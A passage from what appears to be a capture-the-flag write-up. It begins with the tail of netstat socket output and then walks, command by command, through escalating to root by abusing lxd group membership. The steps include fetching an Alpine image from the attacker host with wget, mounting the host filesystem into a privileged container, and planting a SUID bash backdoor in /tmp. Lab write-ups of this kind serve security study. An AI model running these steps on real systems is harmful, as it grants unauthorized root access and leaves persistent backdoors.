unix  3      [ ]         STREAM     CONNECTED     20481    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    16822
unix  3      [ ]         DGRAM                    17903
unix  3      [ ]         STREAM     CONNECTED     21301    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    19354
unix  3      [ ]         DGRAM                    15935
unix  3      [ ]         STREAM     CONNECTED     18911
unix  2      [ ]         DGRAM                    16819
unix  3      [ ]         STREAM     CONNECTED     21847
unix  3      [ ]         STREAM     CONNECTED     19534
unix  3      [ ]         DGRAM                    16522
unix  2      [ ]         DGRAM                    15841
unix  3      [ ]         STREAM     CONNECTED     17847
unix  3      [ ]         STREAM     CONNECTED     19356
unix  3      [ ]         STREAM     CONNECTED     18833
unix  3      [ ]         STREAM     CONNECTED     21808    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     19315
unix  2      [ ]         DGRAM                    15927
unix  3      [ ]         STREAM     CONNECTED     21807
unix  3      [ ]         STREAM     CONNECTED     15567
unix  3      [ ]         STREAM     CONNECTED     18527
unix  3      [ ]         DGRAM                    16823
unix  3      [ ]         STREAM     CONNECTED     15836    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18528
unix  3      [ ]         DGRAM                    17901
unix  3      [ ]         STREAM     CONNECTED     19355
unix  3      [ ]         STREAM     CONNECTED     19147    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19314
unix  2      [ ]         DGRAM                    19341
unix  3      [ ]         STREAM     CONNECTED     17849    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21812
unix  3      [ ]         STREAM     CONNECTED     19536    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21813    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     15837    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19359    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18006    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19358    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18836    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21310    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19361    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     18989    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20477
unix  3      [ ]         STREAM     CONNECTED     19317    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    15576
unix  3      [ ]         STREAM     CONNECTED     19331
unix  2      [ ]         DGRAM                    17886
unix  3      [ ]         STREAM     CONNECTED     21848    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     21295
unix  3      [ ]         STREAM     CONNECTED     19146
unix  3      [ ]         STREAM     CONNECTED     19357    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     20372
unix  3      [ ]         STREAM     CONNECTED     20376    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20671
unix  2      [ ]         DGRAM                    27593
unix  3      [ ]         STREAM     CONNECTED     20677    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    14829
unix  3      [ ]         DGRAM                    14828
```

---

## `lxd` Privilege Escalation

`namelessone` is a member of the `lxd` group. This membership can be abused to spin up an `lxd` container that mounts the system's root directory (`/`) and then changes its root directory to that of the system, effectively widening its scope and granting `root` access to the  entire system.

The first step is to spin up a container, but there are currently no `lxd` images on the target.

```bash
namelessone@anonymous:~$ lxc image list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04

+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```

Transfer the `lxd` Alpine Linux image in [saghul's lxd-alpine-builder repository](https://github.com/saghul/lxd-alpine-builder) to the target.

```bash
$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
namelessone@anonymous:~$ wget http://10.6.31.77/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-01-23 05:50:03--  http://10.6.31.77/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.6.31.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.tar. 100%[============================================================================>]   3.11M   784KB/s    in 4.3s

2022-01-23 05:50:08 (748 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
```

Import the image.

```bash
namelessone@anonymous:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias tgihf-image -v
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
```

Configure the default LXD storage pool since it isn't configured already.

```bash
namelessone@anonymous:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir) [default=btrfs]:
Create a new BTRFS pool? (yes/no) [default=yes]:
Would you like to use an existing block device? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=15GB]:
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like LXD to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

Create the container.

```bash
namelessone@anonymous:~$ lxc init tgihf-image tgihf-container -c security.privileged=true
Creating tgihf-container
```

Mount the target system's root directory (`/`) to the container's directory `/mnt/root/`.

```bash
namelessone@anonymous:~$ lxc config device add tgihf-container rootdisk disk source=/ path=/mnt/root recursive=true
Device rootdisk added to tgihf-container
```

Start the container, enter into a shell, and grab the system flag from `/mnt/root/root/root.txt`.

```bash
namelessone@anonymous:~$ lxc start tgihf-container
namelessone@anonymous:~$ lxc exec tgihf-container /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # ls -la /mnt/root/root/root.txt
-rw-r--r--    1 root     root            33 May 11  2020 /mnt/root/root/root.txt
```

For shell access as `root` completely separate from the container, create a SUID `bash` executable, exit the container, and execute the SUID `bash` executable.

```bash
~ # cp /mnt/root/bin/bash /mnt/root/tmp/bash
~ # chmod +s /mnt/root/tmp/bash
~ # exit
namelessone@anonymous:~$ ls -la /tmp/bash
-rwsr-sr-x 1 root root 1113504 Jan 23 06:00 /tmp/bash
namelessone@anonymous:~$ /tmp/bash -p
bash-4.4# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(namelessone)
```
